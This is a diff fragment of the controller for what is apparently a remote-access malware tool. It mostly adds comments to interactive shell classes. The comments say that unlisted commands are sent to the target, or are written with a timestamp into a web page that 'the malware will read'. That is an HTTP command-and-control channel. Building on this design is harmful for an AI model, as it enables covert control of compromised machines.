@@ -72,13 +72,13 @@ class interacting(Cmd):
             clear = lambda: os.system('clear')
             clear()
 
-
+        #deconnect and quit the interacting shell
         elif command == "deconnect":
             self.conn.close()
             end = "Close Connection"
             return end
 
-
+            #quit interacting shell and go back to main menu
         elif command == "exit":
             return False
         #all command that aren't listed above are sent to the target
@@ -136,10 +136,13 @@ class HTTPinteracting(Cmd):
             clear = lambda: os.system('clear')
             clear()
 
+        #quit the interacting shell and go back to main menu
         elif command == "exit":
             return False
 
         else:
+            #all command not listed above are sent and displayed on the web page
+            #of the server the malware will read it and sent a response
             #try:
             index = open(self.path, 'w')
             index.write(str(datetime.datetime.now())+"||"+command)
